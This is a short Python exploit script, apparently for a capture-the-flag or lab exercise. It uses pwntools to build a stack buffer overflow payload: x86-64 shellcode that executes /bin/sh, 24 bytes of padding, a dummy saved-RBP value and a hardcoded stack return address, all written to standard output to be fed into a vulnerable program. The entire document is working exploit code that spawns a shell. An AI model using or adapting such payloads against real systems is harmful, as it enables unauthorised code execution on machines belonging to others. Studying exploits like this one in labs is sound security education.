#!/usr/bin/python

import pwn
import sys

shellcode = (
    b"\x50\x48\x31\xd2\x48\x31\xf6\x48"
    + b"\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
    + b"\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
)

padding = b"a" * 24

rbp = b"b" * 8

address = 0x7FFFFFFFDB40

address = pwn.p64(address)

sys.stdout.buffer.write(shellcode + padding + rbp + address)
